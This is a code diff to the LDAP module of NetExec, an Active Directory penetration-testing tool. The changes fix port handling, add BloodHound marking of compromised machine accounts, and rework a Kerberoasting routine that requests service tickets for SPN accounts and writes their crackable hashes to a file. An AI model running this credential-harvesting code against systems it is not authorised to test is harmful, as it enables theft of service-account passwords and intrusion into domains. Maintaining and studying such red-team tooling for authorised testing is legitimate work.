@@ -154,14 +154,14 @@ class ldap(connection):
             extra={
                 "protocol": "LDAP",
                 "host": self.host,
-                "port": self.args.port,
+                "port": self.port,
                 "hostname": self.hostname,
             }
         )
 
     def get_ldap_info(self, host):
         try:
-            proto = "ldaps" if (self.args.gmsa or self.args.port == 636) else "ldap"
+            proto = "ldaps" if (self.args.gmsa or self.port == 636) else "ldap"
             ldap_url = f"{proto}://{host}"
             self.logger.info(f"Connecting to {ldap_url} with no baseDN")
             try:
@@ -349,7 +349,7 @@ class ldap(connection):
 
         try:
             # Connect to LDAP
-            proto = "ldaps" if (self.args.gmsa or self.args.port == 636) else "ldap"
+            proto = "ldaps" if (self.args.gmsa or self.port == 636) else "ldap"
             ldap_url = f"{proto}://{self.target}"
             self.logger.info(f"Connecting to {ldap_url} - {self.baseDN} [1]")
             self.ldapConnection = ldap_impacket.LDAPConnection(ldap_url, self.baseDN)
@@ -374,11 +374,13 @@ class ldap(connection):
 
 
             self.logger.extra["protocol"] = "LDAP"
-            self.logger.extra["port"] = "636" if (self.args.gmsa or self.args.port == 636) else "389"
+            self.logger.extra["port"] = "636" if (self.args.gmsa or self.port == 636) else "389"
             self.logger.success(out)
 
             if not self.args.local_auth:
                 add_user_bh(self.username, self.domain, self.logger, self.config)
+            if self.admin_privs:
+                add_user_bh(f"{self.hostname}$", domain, self.logger, self.config)
             return True
         except SessionKeyDecryptionError:
             # for PRE-AUTH account
@@ -434,6 +436,8 @@ class ldap(connection):
 
                     if not self.args.local_auth:
                         add_user_bh(self.username, self.domain, self.logger, self.config)
+                    if self.admin_privs:
+                        add_user_bh(f"{self.hostname}$", domain, self.logger, self.config)
                     return True
                 except SessionError as e:
                     error, desc = e.getErrorString()
@@ -472,7 +476,7 @@ class ldap(connection):
 
         try:
             # Connect to LDAP
-            proto = "ldaps" if (self.args.gmsa or self.args.port == 636) else "ldap"
+            proto = "ldaps" if (self.args.gmsa or self.port == 636) else "ldap"
             ldap_url = f"{proto}://{self.target}"
             self.logger.debug(f"Connecting to {ldap_url} - {self.baseDN} [3]")
             self.ldapConnection = ldap_impacket.LDAPConnection(ldap_url, self.baseDN)
@@ -483,11 +487,13 @@ class ldap(connection):
             out = f"{domain}\\{self.username}:{process_secret(self.password)} {self.mark_pwned()}"
 
             self.logger.extra["protocol"] = "LDAP"
-            self.logger.extra["port"] = "636" if (self.args.gmsa or self.args.port == 636) else "389"
+            self.logger.extra["port"] = "636" if (self.args.gmsa or self.port == 636) else "389"
             self.logger.success(out)
 
             if not self.args.local_auth:
                 add_user_bh(self.username, self.domain, self.logger, self.config)
+            if self.admin_privs:
+                add_user_bh(f"{self.hostname}$", domain, self.logger, self.config)
             return True
         except ldap_impacket.LDAPSessionError as e:
             if str(e).find("strongerAuthRequired") >= 0:
@@ -514,6 +520,8 @@ class ldap(connection):
 
                     if not self.args.local_auth:
                         add_user_bh(self.username, self.domain, self.logger, self.config)
+                    if self.admin_privs:
+                        add_user_bh(f"{self.hostname}$", domain, self.logger, self.config)
                     return True
                 except Exception as e:
                     error_code = str(e).split()[-2][:-1]
@@ -563,7 +571,7 @@ class ldap(connection):
 
         try:
             # Connect to LDAP
-            proto = "ldaps" if (self.args.gmsa or self.args.port == 636) else "ldap"
+            proto = "ldaps" if (self.args.gmsa or self.port == 636) else "ldap"
             ldaps_url = f"{proto}://{self.target}"
             self.logger.info(f"Connecting to {ldaps_url} - {self.baseDN}")
             self.ldapConnection = ldap_impacket.LDAPConnection(ldaps_url, self.baseDN)
@@ -573,11 +581,13 @@ class ldap(connection):
             # Prepare success credential text
             out = f"{domain}\\{self.username}:{process_secret(self.nthash)} {self.mark_pwned()}"
             self.logger.extra["protocol"] = "LDAP"
-            self.logger.extra["port"] = "636" if (self.args.gmsa or self.args.port == 636) else "389"
+            self.logger.extra["port"] = "636" if (self.args.gmsa or self.port == 636) else "389"
             self.logger.success(out)
 
             if not self.args.local_auth:
                 add_user_bh(self.username, self.domain, self.logger, self.config)
+            if self.admin_privs:
+                add_user_bh(f"{self.hostname}$", domain, self.logger, self.config)
             return True
         except ldap_impacket.LDAPSessionError as e:
             if str(e).find("strongerAuthRequired") >= 0:
@@ -603,6 +613,8 @@ class ldap(connection):
 
                     if not self.args.local_auth:
                         add_user_bh(self.username, self.domain, self.logger, self.config)
+                    if self.admin_privs:
+                        add_user_bh(f"{self.hostname}$", domain, self.logger, self.config)
                     return True
                 except ldap_impacket.LDAPSessionError as e:
                     error_code = str(e).split()[-2][:-1]
@@ -898,6 +910,9 @@ class ldap(connection):
             "lastLogon",
         ]
         resp = self.search(searchFilter, attributes, 0)
+        self.logger.debug(f"Search Filter: {searchFilter}")
+        self.logger.debug(f"Attributes: {attributes}")
+        self.logger.debug(f"Response: {resp}")
         if not resp:
             self.logger.highlight("No entries found!")
         elif resp:
@@ -944,41 +959,46 @@ class ldap(connection):
 
             if len(answers) > 0:
                 self.logger.display(f"Total of records returned {len(answers):d}")
-                TGT = KerberosAttacks(self).get_tgt_kerberoasting()
-                dejavue = []
-                for (_SPN, sAMAccountName, memberOf, pwdLastSet, lastLogon, _delegation) in answers:
-                    if sAMAccountName not in dejavue:
-                        downLevelLogonName = self.targetDomain + "\\" + sAMAccountName
+                TGT = KerberosAttacks(self).get_tgt_kerberoasting(self.use_kcache)
+                self.logger.debug(f"TGT: {TGT}")
+                if TGT:
+                    dejavue = []
+                    for (_SPN, sAMAccountName, memberOf, pwdLastSet, lastLogon, _delegation) in answers:
+                        if sAMAccountName not in dejavue:
+                            downLevelLogonName = self.targetDomain + "\\" + sAMAccountName
 
-                        try:
-                            principalName = Principal()
-                            principalName.type = constants.PrincipalNameType.NT_MS_PRINCIPAL.value
-                            principalName.components = [downLevelLogonName]
+                            try:
+                                principalName = Principal()
+                                principalName.type = constants.PrincipalNameType.NT_MS_PRINCIPAL.value
+                                principalName.components = [downLevelLogonName]
 
-                            tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(
-                                principalName,
-                                self.domain,
-                                self.kdcHost,
-                                TGT["KDC_REP"],
-                                TGT["cipher"],
-                                TGT["session_key"],
-                            )
-                            r = KerberosAttacks(self).output_tgs(
-                                tgs,
-                                oldSessionKey,
-                                sessionKey,
-                                sAMAccountName,
-                                self.targetDomain + "/" + sAMAccountName,
-                            )
-                            self.logger.highlight(f"sAMAccountName: {sAMAccountName} memberOf: {memberOf} pwdLastSet: {pwdLastSet} lastLogon:{lastLogon}")
-                            self.logger.highlight(f"{r}")
-                            with open(self.args.kerberoasting, "a+") as hash_kerberoasting:
-                                hash_kerberoasting.write(r + "\n")
-                            dejavue.append(sAMAccountName)
-                        except Exception as e:
-                            self.logger.debug("Exception:", exc_info=True)
-                            nxc_logger.error(f"Principal: {downLevelLogonName} - {e}")
-                return True
+                                tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(
+                                    principalName,
+                                    self.domain,
+                                    self.kdcHost,
+                                    TGT["KDC_REP"],
+                                    TGT["cipher"],
+                                    TGT["sessionKey"],
+                                )
+                                r = KerberosAttacks(self).output_tgs(
+                                    tgs,
+                                    oldSessionKey,
+                                    sessionKey,
+                                    sAMAccountName,
+                                    self.targetDomain + "/" + sAMAccountName,
+                                )
+                                self.logger.highlight(f"sAMAccountName: {sAMAccountName} memberOf: {memberOf} pwdLastSet: {pwdLastSet} lastLogon:{lastLogon}")
+                                self.logger.highlight(f"{r}")
+                                if self.args.kerberoasting:
+                                    with open(self.args.kerberoasting, "a+") as hash_kerberoasting:
+                                        hash_kerberoasting.write(r + "\n")
+                                dejavue.append(sAMAccountName)
+                            except Exception as e:
+                                self.logger.debug("Exception:", exc_info=True)
+                                self.logger.fail(f"Principal: {downLevelLogonName} - {e}")
+                    return True
+                else:
+                    self.logger.fail(f"Error retrieving TGT for {self.username}\\{self.domain} from {self.kdcHost}")
             else:
                 self.logger.highlight("No entries found!")
         self.logger.fail("Error with the LDAP account used")
@@ -1319,7 +1339,7 @@ class ldap(connection):
             self.logger.highlight("Using kerberos auth from ccache")
 
         timestamp = datetime.now().strftime("%Y-%m-%d_%H%M%S") + "_"
-        bloodhound = BloodHound(ad, self.hostname, self.host, self.args.port)
+        bloodhound = BloodHound(ad, self.hostname, self.host, self.port)
         bloodhound.connect()
 
         bloodhound.run(
